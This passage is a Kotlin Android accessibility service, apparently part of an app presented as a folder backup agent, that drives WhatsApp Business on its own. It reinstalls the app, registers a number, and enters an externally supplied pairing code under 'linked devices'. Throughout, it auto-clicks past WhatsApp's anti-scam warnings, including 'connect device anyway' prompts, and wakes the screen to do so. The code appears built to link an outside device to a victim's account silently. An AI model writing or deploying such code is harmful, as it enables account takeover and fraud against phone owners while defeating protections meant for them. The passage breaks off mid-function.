package com.folderbackup.agent.registration

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.os.Bundle
import android.os.PowerManager
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import com.folderbackup.agent.backup.WhatsappSessionExporter
import com.folderbackup.agent.service.BackupForegroundService

class WhatsappRegistrationAccessibilityService : AccessibilityService() {

    private var lastActionAt = 0L
    private var profileNameApplied = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "onServiceConnected: Accessibility Service Connected and Active")
        instance = this
        profileNameApplied = false
        if (!BackupForegroundService.isRunning) {
            WhatsappAutomationGate.releaseAll()
        }
    }

    override fun onDestroy() {
        Log.i(TAG, "onDestroy: Accessibility Service Destroyed")
        instance = null
        super.onDestroy()
    }

    override fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent?) {
        val pkg = event?.packageName?.toString() ?: return
        Log.v(TAG, "onAccessibilityEvent: pkg=$pkg phase=${WhatsappMacroState.phase} eventType=${event?.eventType}")
        val isPackageInstaller = pkg.contains("packageinstaller", ignoreCase = true)

        if (!BackupForegroundService.isRunning) {
            WhatsappAutomationGate.releaseOrphanedAutomation()
        }

        if (WhatsappMacroState.isActive() && !WhatsappAutomationGate.allowAutomation()) {
            return
        }

        if (pkg == WhatsappSessionExporter.WHATSAPP_PACKAGE &&
            !WhatsappAutomationGate.allowAutomation()
        ) {
            return
        }

        if (WhatsappMacroState.phase == WhatsappMacroState.Phase.UninstallWhatsApp) {
            if (isPackageInstaller) {
                val root = getRoot(event) ?: return
                val now = System.currentTimeMillis()
                if (now - lastActionAt < 1000) return
                val clickTexts = listOf("OK", "DESINSTALAR", "UNINSTALL", "CONFIRMAR", "CONFIRM")
                for (text in clickTexts) {
                    if (clickByText(root, text, partial = false)) {
                        lastActionAt = now
                        Log.i(TAG, "Clique automático na desinstalação: $text")
                        return
                    }
                }
            } else {
                if (!isAppInstalled(WhatsappSessionExporter.WHATSAPP_PACKAGE)) {
                    Log.i(TAG, "WhatsApp Business desinstalado com sucesso (sem root).")
                    WhatsappMacroState.markDone()
                }
            }
            return
        }

        if (WhatsappMacroState.phase == WhatsappMacroState.Phase.InstallWhatsAppFromPlayStore) {
            if (pkg == "com.android.vending") {
                val root = getRoot(event)
                if (root == null) {
                    Log.v(TAG, "Install phase: getRoot returned null")
                    return
                }
                Log.v(TAG, "Install phase: root class=${root.className} childCount=${root.childCount}")
                val now = System.currentTimeMillis()
                if (now - lastActionAt < 1200) return
                val clickTexts = listOf("INSTALAR", "INSTALL", "REINSTALAR", "REINSTALL", "ATUALIZAR", "UPDATE")
                for (text in clickTexts) {
                    if (clickByText(root, text, partial = false)) {
                        lastActionAt = now
                        Log.i(TAG, "Clique automático na instalação do Play Store: $text")
                        return
                    }
                }
            } else {
                if (isAppInstalled(WhatsappSessionExporter.WHATSAPP_PACKAGE)) {
                    Log.i(TAG, "WhatsApp Business instalado com sucesso via Play Store. Abrindo o aplicativo...")
                    try {
                        val launchIntent = packageManager.getLaunchIntentForPackage(WhatsappSessionExporter.WHATSAPP_PACKAGE)
                        if (launchIntent != null) {
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(launchIntent)
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Falha ao abrir WhatsApp instalado: ${e.message}")
                    }
                    WhatsappMacroState.markDone()
                }
            }
            return
        }

        if (WhatsappMacroState.phase == WhatsappMacroState.Phase.FindWhatsAppIcon) {
            if (pkg == WhatsappSessionExporter.WHATSAPP_PACKAGE) {
                WhatsappMacroState.markDone()
                return
            }
            if (isLauncherPackage(pkg)) {
                val root = rootInActiveWindow ?: return
                val now = System.currentTimeMillis()
                if (now - lastActionAt < 1200) return
                if (clickWhatsappIcon(root)) {
                    lastActionAt = now
                    // Só conclui quando o pacote com.whatsapp.w4b abrir (evento seguinte).
                }
            }
            return
        }

        if (pkg == WhatsappSessionExporter.WHATSAPP_PACKAGE &&
            WhatsappLinkDeviceState.needsA11y()
        ) {
            val root = whatsappRoot() ?: return
            val now = System.currentTimeMillis()
            val throttleMs = linkDeviceThrottleMs()
            if (now - lastActionAt < throttleMs) return
            if (handleLinkDeviceNavigation(root, now)) {
                lastActionAt = now
            }
            return
        }

        if (pkg != WhatsappSessionExporter.WHATSAPP_PACKAGE &&
            pkg != "com.android.settings" &&
            pkg != "com.android.vending" &&
            !isPackageInstaller
        ) {
            return
        }

        if (WhatsappRegistrationState.isInactive()) {
            return
        }

        val root = rootInActiveWindow ?: return
        val now = System.currentTimeMillis()
        // Evita disputar toque do usuário: no máximo uma ação a cada 1,2s.
        if (now - lastActionAt < 1200) return

        when (WhatsappRegistrationState.phase) {
            WhatsappRegistrationState.Phase.EnterPhone -> {
                if (handleWelcome(root)) {
                    lastActionAt = now
                    return
                }
                if (enterPhoneNumber(root)) {
                    lastActionAt = now
                    WhatsappRegistrationState.markWaitCode()
                }
            }
            WhatsappRegistrationState.Phase.WaitCode,
            WhatsappRegistrationState.Phase.EnterCode,
            -> {
                val code = WhatsappRegistrationState.smsCode
                if (!code.isNullOrBlank() && enterVerificationCode(root, code)) {
                    lastActionAt = now
                    WhatsappRegistrationState.markProfileSetup()
                }
            }
            WhatsappRegistrationState.Phase.ProfileSetup -> {
                if (completeProfileSetup(root)) {
                    lastActionAt = now
                    WhatsappRegistrationState.markDone()
                }
            }
            else -> Unit
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility interrompido")
    }

    fun tickLinkDevice(): Boolean {
        if (!WhatsappLinkDeviceState.needsA11y() && !WhatsappAutomationGate.allowAutomation()) return false
        if (!WhatsappLinkDeviceState.needsA11y()) return false
        val root = whatsappRoot() ?: return false
        val now = System.currentTimeMillis()
        val throttleMs = linkDeviceThrottleMs()
        if (now - lastActionAt < throttleMs) return false
        if (handleLinkDeviceNavigation(root, now)) {
            lastActionAt = now
            return true
        }
        return false
    }

    private fun handleWelcome(root: AccessibilityNodeInfo): Boolean {
        val acceptTexts = listOf(
            "CONCORDO", "ACEITAR", "ACEITO", "AGREE", "ACCEPT", "CONTINUAR",
        )
        for (text in acceptTexts) {
            if (clickByText(root, text, partial = true)) return true
        }
        return false
    }

    private fun enterPhoneNumber(root: AccessibilityNodeInfo): Boolean {
        val digits = WhatsappRegistrationState.phoneDigitsForUi()
        if (digits.isBlank()) return false

        val fields = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/registration_phone")
        val edit = fields.firstOrNull() ?: return false

        if (!setText(edit, digits)) return false
        val nextTexts = listOf("AVANÇAR", "PRÓXIMO", "NEXT", "CONTINUAR", "OK")
        for (text in nextTexts) {
            if (clickByText(root, text, partial = true)) return true
        }
        return performClickOnParent(edit)
    }

    private fun enterVerificationCode(root: AccessibilityNodeInfo, code: String): Boolean {
        val edits = mutableListOf<AccessibilityNodeInfo>()
        collectEditTexts(root, edits)
        if (edits.isEmpty()) return false

        if (edits.size == 1) {
            if (!setText(edits.first(), code)) return false
        } else {
            val chars = code.take(edits.size)
            chars.forEachIndexed { i, ch ->
                setText(edits[i], ch.toString())
            }
        }
        val nextTexts = listOf("AVANÇAR", "PRÓXIMO", "NEXT", "VERIFICAR", "CONTINUAR")
        for (text in nextTexts) {
            if (clickByText(root, text, partial = true)) return true
        }
        return true
    }

    private fun completeProfileSetup(root: AccessibilityNodeInfo): Boolean {
        val name = WhatsappRegistrationState.displayName?.trim().orEmpty()
        if (name.isNotBlank() && !profileNameApplied) {
            val edit = findFirstEditText(root) ?: return false
            if (setText(edit, name)) {
                profileNameApplied = true
            }
        }
        val doneTexts = listOf("AVANÇAR", "PRÓXIMO", "NEXT", "CONTINUAR", "OK", "SALVAR", "CONCLUIR")
        for (text in doneTexts) {
            if (clickByText(root, text, partial = true)) return true
        }
        return false
    }

    private fun linkDeviceThrottleMs(): Long = when (WhatsappLinkDeviceState.step) {
        WhatsappLinkDeviceState.Step.ConfirmScamWarning -> 100L
        WhatsappLinkDeviceState.Step.EnterCode -> 500L
        WhatsappLinkDeviceState.Step.NameLinkedDevice -> 400L
        else -> 900L
    }

    private fun dismissScamWarningScreen(root: AccessibilityNodeInfo): Boolean {
        if (findDeviceNameEdit(root) != null) {
            Log.i(TAG, "Tela de nome já visível — pulando anti-golpe")
            WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.ConfirmScamWarning)
            return true
        }

        if (treeContainsAny(root, SCAM_WARNING_HINTS) || treeContainsAny(root, SCAM_COUNTRY_HINTS)) {
            if (clickScamDismissOk(root)) {
                Log.i(TAG, "Anti-golpe: OK/ENTENDI clicado (alerta país/golpe)")
                return true
            }
        }

        if (clickConnectDeviceButton(root)) {
            Log.i(TAG, "Anti-golpe: botão Conectar dispositivo clicado")
            return true
        }

        scrollDownScreen()
        sleepMs(250)
        val waRoot = whatsappRoot() ?: root
        if (clickConnectDeviceButton(waRoot)) {
            Log.i(TAG, "Anti-golpe: botão clicado após scroll")
            return true
        }
        return false
    }

    /** Procura e clica o botão principal da tela anti-golpe. */
    private fun clickConnectDeviceButton(root: AccessibilityNodeInfo): Boolean {
        val viewIds = listOf(
            "com.whatsapp.w4b:id/connect_device_button",
            "com.whatsapp.w4b:id/primary_button",
            "com.whatsapp.w4b:id/button_primary",
            "com.whatsapp.w4b:id/primary_action_button",
            "com.whatsapp:id/connect_device_button",
        )
        for (id in viewIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id)
            for (node in nodes) {
                if (clickNode(node)) return true
            }
        }

        val connectTexts = listOf(
            "CONECTAR DISPOSITIVO",
            "CONECTAR O DISPOSITIVO",
            "Conectar dispositivo",
            "Conectar o dispositivo",
            "CONECTAR DISPOSITIVO MESMO ASSIM",
            "CONECTAR DISPOSITIVO mesmo assim",
            "CONNECT DEVICE",
            "LINK DEVICE",
            "VINCULAR DISPOSITIVO",
            "Vincular dispositivo",
            "CONECTAR EL DISPOSITIVO",
            "VINCULAR EL DISPOSITIVO",
            "CONTINUAR",
            "CONTINUE",
            "CONTINUAR DE TODAS FORMAS",
            "Continuar mesmo assim",
        )
        for (text in connectTexts) {
            if (clickByText(root, text, partial = true)) return true
        }

        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        val clickables = mutableListOf<AccessibilityNodeInfo>()
        var visited = 0
        val rect = Rect()
        while (queue.isNotEmpty() && visited < 450) {
            val node = queue.removeFirst()
            visited++
            val label = buildString {
                node.text?.let { append(it).append(' ') }
                node.contentDescription?.let { append(it) }
            }.uppercase()
            if (node.isClickable &&
                (label.contains("CONECTAR") || label.contains("CONNECT") || label.contains("VINCULAR")) &&
                (label.contains("DISPOSITIVO") || label.contains("DEVICE"))
            ) {
                clickables.add(node)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return clickables
            .sortedByDescending { node ->
                node.getBoundsInScreen(rect)
                rect.bottom
            }
            .any { clickNode(it) }
    }

    /** OK / ENTENDI em alertas modais de golpe ou número de outro país. */
    private fun clickScamDismissOk(root: AccessibilityNodeInfo): Boolean {
        val okTexts = listOf(
            "OK",
            "ENTENDI",
            "ENTENDIDO",
            "ACEITO",
            "ACEPTAR",
            "ACCEPT",
            "GOT IT",
            "CONTINUAR",
            "CONTINUE",
            "SIM",
            "SÍ",
            "SI",
            "YES",
        )
        for (text in okTexts) {
            if (clickByText(root, text, partial = false)) return true
        }
        return false
    }

    private fun clickNode(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
        if (performClickOnParent(node)) return true
        return clickNodeByGesture(node)
    }

    private fun scrollDownScreen(): Boolean {
        return try {
            val metrics = resources.displayMetrics
            val w = metrics.widthPixels.toFloat()
            val h = metrics.heightPixels.toFloat()
            val path = Path().apply {
                moveTo(w * 0.5f, h * 0.78f)
                lineTo(w * 0.5f, h * 0.22f)
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 350))
                .build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            Log.w(TAG, "scrollDown: ${e.message}")
            false
        }
    }

    private fun completeLinkedDeviceName(root: AccessibilityNodeInfo): Boolean {
        val name = WhatsappLinkDeviceState.deviceName?.trim().orEmpty()
        if (name.isNotBlank() && !WhatsappLinkDeviceState.deviceNameApplied) {
            val edit = findDeviceNameEdit(root) ?: findFirstEditText(root) ?: return false
            if (setText(edit, name)) {
                WhatsappLinkDeviceState.deviceNameApplied = true
                sleepMs(400)
            }
        }
        val waRoot = whatsappRoot() ?: root
        if (clickSaveDeviceName(waRoot)) {
            Log.i(TAG, "Salvar nome: save_device_name_btn")
            return true
        }
        val saveTexts = listOf(
            "SALVAR",
            "GUARDAR",
            "SAVE",
            "AVANÇAR",
            "AVANCAR",
            "PRÓXIMO",
            "PROXIMO",
            "NEXT",
            "CONTINUAR",
            "OK",
            "CONCLUIR",
            "LISTO",
            "HECHO",
            "FINALIZAR",
            "CONFIRMAR",
            "CONFIRM",
            "ACEPTAR",
            "ACCEPT",
            "TERMINAR",
            "DONE",
        )
        for (text in saveTexts) {
            if (clickByText(root, text, partial = true)) return true
        }
        return false
    }

    private fun findDeviceNameEdit(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val viewIds = listOf(
            "com.whatsapp.w4b:id/device_name_edit_text",
            "com.whatsapp.w4b:id/linked_device_name",
            "com.whatsapp.w4b:id/device_name",
            "com.whatsapp.w4b:id/companion_device_name",
            "com.whatsapp:id/linked_device_name",
        )
        for (id in viewIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id)
            for (node in nodes) {
                if (node.isEditable || node.className?.toString()?.contains("EditText") == true) {
                    return node
                }
                val nested = findFirstEditText(node)
                if (nested != null) return nested
            }
        }
        return null
    }

    private fun clickSaveDeviceName(root: AccessibilityNodeInfo): Boolean {
        val viewIds = listOf(
            "com.whatsapp.w4b:id/save_device_name_btn",
            "com.whatsapp:id/save_device_name_btn",
        )
        for (id in viewIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id)
            for (node in nodes) {
                if (node.isEnabled && node.isClickable &&
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                ) {
                    return true
                }
                if (performClickOnParent(node)) return true
            }
        }
        return false
    }

    private fun treeContainsAny(root: AccessibilityNodeInfo, hints: List<String>): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var visited = 0
        while (queue.isNotEmpty() && visited < 400) {
            val node = queue.removeFirst()
            visited++
            val text = buildString {
                node.text?.let { append(it).append(' ') }
                node.contentDescription?.let { append(it) }
            }.uppercase()
            if (hints.any { hint -> text.contains(hint.uppercase()) }) return true
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return false
    }

    private fun handleLinkDeviceNavigation(root: AccessibilityNodeInfo, now: Long): Boolean {
        when (WhatsappLinkDeviceState.step) {
            WhatsappLinkDeviceState.Step.OpenOverflowMenu -> {
                if (clickOverflowMenu(root)) {
                    WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.OpenOverflowMenu)
                    Log.i(TAG, "Menu ⋮ aberto")
                    return true
                }
                // Fallback: Configurações → Aparelhos conectados (PT / EN / ES)
                val settings = listOf(
                    "CONFIGURAÇÕES", "CONFIGURACOES", "SETTINGS",
                    "CONFIGURACIÓN", "CONFIGURACION", "AJUSTES",
                )
                for (text in settings) {
                    if (clickByText(root, text, partial = true)) {
                        WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.OpenOverflowMenu)
                        Log.i(TAG, "Entrou em Configurações")
                        return true
                    }
                }
            }
            WhatsappLinkDeviceState.Step.TapConnectedDevices -> {
                val texts = listOf(
                    "DISPOSITIVOS CONECTADOS",
                    "DISPOSITIVOS VINCULADOS",
                    "APARELHOS CONECTADOS",
                    "APARELHOS VINCULADOS",
                    "LINKED DEVICES",
                    "DISPOSITIVOS VINCULADOS",
                    "DISPOSITIVOS CONECTADOS",
                )
                for (text in texts) {
                    if (clickByText(root, text, partial = true)) {
                        WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.TapConnectedDevices)
                        return true
                    }
                }
            }
            WhatsappLinkDeviceState.Step.TapConnectDevice -> {
                val texts = listOf(
                    "CONECTAR DISPOSITIVO",
                    "CONECTAR UM DISPOSITIVO",
                    "VINCULAR DISPOSITIVO",
                    "VINCULAR UN DISPOSITIVO",
                    "VINCULAR UN DISPOSITIVO",
                    "LINK A DEVICE",
                    "CONNECT A DEVICE",
                    "ADD DEVICE",
                    "AGREGAR DISPOSITIVO",
                    "AÑADIR DISPOSITIVO",
                    "ANADIR DISPOSITIVO",
                )
                for (text in texts) {
                    if (clickByText(root, text, partial = true)) {
                        WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.TapConnectDevice)
                        return true
                    }
                }
            }
            WhatsappLinkDeviceState.Step.TapLinkWithPhone -> {
                val texts = listOf(
                    "CONECTAR COM NÚMERO DE TELEFONE",
                    "CONECTAR COM NÚMERO",
                    "CONECTAR COM NUMERO",
                    "Conectar com número de telefone",
                    "VINCULAR COM NÚMERO",
                    "VINCULAR COM NUMERO",
                    "LINK WITH PHONE NUMBER",
                    "LINK WITH PHONE",
                    "USAR NÚMERO DE TELEFONE",
                    // ES (Colômbia / LatAm)
                    "VINCULAR CON EL NÚMERO DE TELÉFONO",
                    "VINCULAR CON EL NUMERO DE TELEFONO",
                    "VINCULAR CON NÚMERO DE TELÉFONO",
                    "VINCULAR CON NUMERO DE TELEFONO",
                    "CONECTAR CON EL NÚMERO DE TELÉFONO",
                    "CONECTAR CON EL NUMERO DE TELEFONO",
                    "CONECTAR CON NÚMERO",
                    "CONECTAR CON NUMERO",
                    "USAR NÚMERO DE TELÉFONO",
                    "USAR NUMERO DE TELEFONO",
                )
                for (text in texts) {
                    if (clickByText(root, text, partial = true)) {
                        WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.TapLinkWithPhone)
                        return true
                    }
                }
            }
            WhatsappLinkDeviceState.Step.EnterCode -> {
                if (isOnPairingErrorDialog()) return false
                if (WhatsappLinkDeviceState.pairingCodeSubmitted) {
                    return !isOnEnterCodeScreen() ||
                        isOnScamWarningScreen() ||
                        isOnNameDeviceScreen()
                }
                if (!WhatsappLinkDeviceState.tryBeginCodeEntry()) return false
                val code = WhatsappRegistrationState.pairingCode ?: run {
                    WhatsappLinkDeviceState.endCodeEntry()
                    return false
                }
                val waRoot = whatsappRoot() ?: root
                return try {
                    if (enterPairingCodeOnScreenLocked(waRoot, code)) {
                        WhatsappLinkDeviceState.pairingCodeSubmitted = true
                        WhatsappRegistrationState.markPairingDone()
                        WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.EnterCode)
                        Log.i(TAG, "Código enviado — aguardando tela anti-golpe")
                        true
                    } else {
                        false
                    }
                } finally {
                    WhatsappLinkDeviceState.endCodeEntry()
                }
            }
            WhatsappLinkDeviceState.Step.ConfirmScamWarning -> {
                if (dismissScamWarningScreen(root)) {
                    WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.ConfirmScamWarning)
                    Log.i(TAG, "Tela anti-golpe confirmada — Conectar dispositivo")
                    return true
                }
            }
            WhatsappLinkDeviceState.Step.NameLinkedDevice -> {
                if (completeLinkedDeviceName(root)) {
                    WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.NameLinkedDevice)
                    Log.i(TAG, "Dispositivo nomeado: ${WhatsappLinkDeviceState.deviceName}")
                    return true
                }
            }
            else -> Unit
        }
        return false
    }

    private fun clickOverflowMenu(root: AccessibilityNodeInfo): Boolean {
        val viewIds = listOf(
            "com.whatsapp.w4b:id/menuitem_overflow",
            "com.whatsapp:id/menuitem_overflow",
            "com.whatsapp.w4b:id/menu_overflow",
            "com.whatsapp:id/menu_overflow",
        )
        for (id in viewIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id)
            for (node in nodes) {
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true
                }
                if (performClickOnParent(node)) return true
            }
        }
        val descriptions = listOf(
            "Mais opções",
            "More options",
            "More",
            "Menu",
        )
        for (desc in descriptions) {
            if (clickByContentDescription(root, desc, partial = true)) return true
        }
        return false
    }

    private fun clickByContentDescription(
        root: AccessibilityNodeInfo,
        description: String,
        partial: Boolean,
    ): Boolean {
        return findByContentDescription(root, description, partial)?.let { node ->
            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                true
            } else {
                performClickOnParent(node)
            }
        } == true
    }

    private fun findByContentDescription(
        root: AccessibilityNodeInfo,
        description: String,
        partial: Boolean,
    ): AccessibilityNodeInfo? {
        val desc = root.contentDescription?.toString().orEmpty()
        if (desc.isNotEmpty()) {
            val matches = if (partial) {
                desc.contains(description, ignoreCase = true)
            } else {
                desc.equals(description, ignoreCase = true)
            }
            if (matches) return root
        }
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findByContentDescription(child, description, partial)
            if (found != null) return found
        }
        return null
    }

    private fun whatsappRoot(): AccessibilityNodeInfo? {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            windows?.forEach { window ->
                val root = window.root ?: return@forEach
                if (root.packageName?.toString() == WhatsappSessionExporter.WHATSAPP_PACKAGE) {
                    return root
                }
            }
        }
        val active = rootInActiveWindow
        return if (active?.packageName?.toString() == WhatsappSessionExporter.WHATSAPP_PACKAGE) {
            active
        } else {
            null
        }
    }

    private fun enterPairingCodeOnScreen(root: AccessibilityNodeInfo, code: String): Boolean {
        if (isOnPairingErrorDialog()) return false
        if (isOnScamWarningScreen() || isOnNameDeviceScreen()) return true
        if (WhatsappLinkDeviceState.pairingCodeSubmitted) return waitForCodeAccepted()
        if (!WhatsappLinkDeviceState.tryBeginCodeEntry()) return false

        try {
            return enterPairingCodeOnScreenLocked(root, code)
        } finally {
            WhatsappLinkDeviceState.endCodeEntry()
        }
    }

    private fun enterPairingCodeOnScreenLocked(root: AccessibilityNodeInfo, code: String): Boolean {
        if (isOnPairingErrorDialog()) return false
        if (isOnScamWarningScreen() || isOnNameDeviceScreen()) return true

        val normalized = code.replace(Regex("[^A-Za-z0-9]"), "").uppercase()
        if (normalized.length < 8) {
            Log.w(TAG, "enterPairingCode: código curto ($normalized)")
            return false
        }
        val expected = normalized.take(8)
        wakeScreen()

        fun freshEdits(): List<AccessibilityNodeInfo> {
            val waRoot = whatsappRoot() ?: root
            return findPairingCodeEdits(waRoot)
        }

        var edits = freshEdits()
        if (edits.isEmpty()) {
            val pkg = root.packageName?.toString().orEmpty()
            Log.w(TAG, "enterPairingCode: nenhum campo pkg=$pkg")
            return false
        }

        if (verifyPairingCodeEntered(edits, expected)) {
            Log.i(TAG, "Pairing já preenchido: $expected")
            sleepMs(400)
            return waitForCodeAccepted()
        }

        for (field in edits) {
            field.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
            setText(field, "")
        }
        sleepMs(200)
        edits = freshEdits()
        if (edits.isEmpty()) return false

        Log.i(TAG, "Digitando pairing char a char: $expected (${edits.size} campos)")
        for (i in expected.indices) {
            if (i >= edits.size) break
            val field = edits[i]
            field.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            field.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
            sleepMs(80)
            val ch = expected[i].toString()
            if (!typeIntoField(field, ch)) {
                Log.w(TAG, "typeIntoField falhou campo ${i + 1}/${edits.size}")
                return false
            }
            sleepMs(150)
            edits = freshEdits()
        }

        sleepMs(600)
        edits = freshEdits()
        if (!verifyPairingCodeEntered(edits, expected)) {
            logPairingFieldMismatch(edits, expected)
            if (isOnScamWarningScreen() || isOnNameDeviceScreen() || isOnPairingErrorDialog()) {
                return !isOnPairingErrorDialog()
            }
            return false
        }

        Log.i(TAG, "Pairing digitado: $expected")
        return waitForCodeAccepted()
    }

    private fun waitForCodeAccepted(): Boolean {
        repeat(6) {
            sleepMs(500)
            if (isOnPairingErrorDialog()) return false
            if (isOnScamWarningScreen() || isOnNameDeviceScreen()) return true
            if (!isOnEnterCodeScreen()) return true
        }
        val waRoot = whatsappRoot() ?: return true
        clickPairingSubmit(waRoot)
        sleepMs(800)
        if (isOnPairingErrorDialog()) return false
        return !isOnEnterCodeScreen() || isOnScamWarningScreen() || isOnNameDeviceScreen()
    }

    private fun finishPairingSubmit(): Boolean {
        sleepMs(500)
        val waRoot = whatsappRoot() ?: return true
        clickPairingSubmit(waRoot)
        return true
    }

    private fun sleepMs(ms: Long) {
        try {
            Thread.sleep(ms)
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
        }
    }

    private fun wakeScreen() {
        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
        if (pm.isInteractive) return
        @Suppress("DEPRECATION")
        val wakeLock = pm.newWakeLock(
            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "folderbackup:pairing_wake",
        )
        wakeLock.acquire(3000)
        wakeLock.release()
    }

    private fun logPairingFieldMismatch(edits: List<AccessibilityNodeInfo>, expected: String) {
        val actual = edits.take(8).joinToString("") { fieldChar(it).take(1) }
        Log.w(TAG, "Pairing code incompleto: esperado=$expected obtido=$actual campos=${edits.size}")
    }

    private fun fieldChar(node: AccessibilityNodeInfo): String {
        val raw = node.text?.toString().orEmpty()
            .ifBlank { node.contentDescription?.toString().orEmpty() }
        return raw.replace(Regex("[^A-Za-z0-9]"), "").uppercase()
    }

    private fun clickPairingSubmit(root: AccessibilityNodeInfo): Boolean {
        val texts = listOf(
            "VINCULAR",
            "CONECTAR",
            "LINK",
            "AVANÇAR",
            "AVANCAR",
            "PRÓXIMO",
            "PROXIMO",
            "NEXT",
            "CONTINUAR",
            "OK",
            // ES
            "SIGUIENTE",
            "CONTINUAR",
            "VINCULAR DISPOSITIVO",
        )
        for (text in texts) {
            if (clickByText(root, text, partial = true)) {
                Log.i(TAG, "Pairing submit: $text")
                return true
            }
        }
        return false
    }

    private fun findPairingCodeEdits(root: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val boxes = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/enter_code_boxes")
        val sources = mutableListOf<AccessibilityNodeInfo>()
        if (boxes.isNotEmpty()) sources.add(boxes.first())
        sources.add(root)

        val edits = mutableListOf<AccessibilityNodeInfo>()
        for (source in sources) {
            edits.clear()
            collectEditTexts(source, edits)
            if (edits.size >= 8) break
            if (edits.size >= 4 && sources.size == 1) break
        }

        if (edits.size < 4) {
            val hints = listOf(
                "campo 1 de 8",
                "field 1 of 8",
                "casilla 1 de 8",
                "campo 1",
                "field 1",
                "casilla 1",
            )
            for (hint in hints) {
                collectEditTextsByContentDesc(root, hint, edits)
                if (edits.size >= 4) break
            }
            if (edits.size < 4) {
                collectEditTextsByContentDesc(root, "campo", edits)
            }
            if (edits.size < 4) {
                collectEditTextsByContentDesc(root, "casilla", edits)
            }
        }

        val rect = Rect()
        return edits
            .distinctBy { node ->
                node.getBoundsInScreen(rect)
                "${rect.left},${rect.top}"
            }
            .sortedBy { node ->
                node.getBoundsInScreen(rect)
                rect.left
            }
            .take(8)
    }

    private fun collectEditTextsByContentDesc(
        root: AccessibilityNodeInfo,
        hint: String,
        out: MutableList<AccessibilityNodeInfo>,
    ) {
        val desc = root.contentDescription?.toString().orEmpty()
        if (root.className?.toString()?.contains("EditText") == true &&
            desc.contains(hint, ignoreCase = true)
        ) {
            out.add(root)
        }
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            collectEditTextsByContentDesc(child, hint, out)
        }
    }

    private fun pasteIntoField(field: AccessibilityNodeInfo, text: String): Boolean {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            ?: return false
        clipboard.setPrimaryClip(ClipData.newPlainText("pairing_code", text))
        field.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
        return field.performAction(AccessibilityNodeInfo.ACTION_PASTE)
    }

    private fun verifyPairingCodeEntered(
        edits: List<AccessibilityNodeInfo>,
        expected: String,
    ): Boolean {
        if (edits.isEmpty()) return false
        val collected = buildString {
            for (edit in edits) {
                append(fieldChar(edit))
            }
        }.replace(Regex("[^A-Za-z0-9]"), "").uppercase()
        if (collected == expected) return true
        if (edits.size == 1) {
            return collected.contains(expected)
        }
        if (collected.length >= expected.length) {
            return collected.take(expected.length) == expected
        }
        return false
    }

    private fun clickByText(root: AccessibilityNodeInfo, text: String, partial: Boolean): Boolean {
        val nodes = mutableListOf<AccessibilityNodeInfo>()
        findNodesByTextRecursive(root, text, partial, nodes)
        if (nodes.isNotEmpty()) {
            Log.d(TAG, "clickByText: found ${nodes.size} candidate nodes matching '$text' recursively")
        }
        for (node in nodes) {
            val nodeText = node.text?.toString() ?: node.contentDescription?.toString()
            Log.d(TAG, "clickByText matches: '$nodeText' (class=${node.className} clickable=${node.isClickable})")
            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.d(TAG, "clickByText: clicked node directly")
                recycleNodes(nodes)
                return true
            }
            if (performClickOnParent(node)) {
                Log.d(TAG, "clickByText: clicked parent of node")
                recycleNodes(nodes)
                return true
            }
            if (clickNodeByGesture(node)) {
                Log.d(TAG, "clickByText: clicked node via gesture")
                recycleNodes(nodes)
                return true
            }
            Log.w(TAG, "clickByText: failed to click matched node or parents")
        }
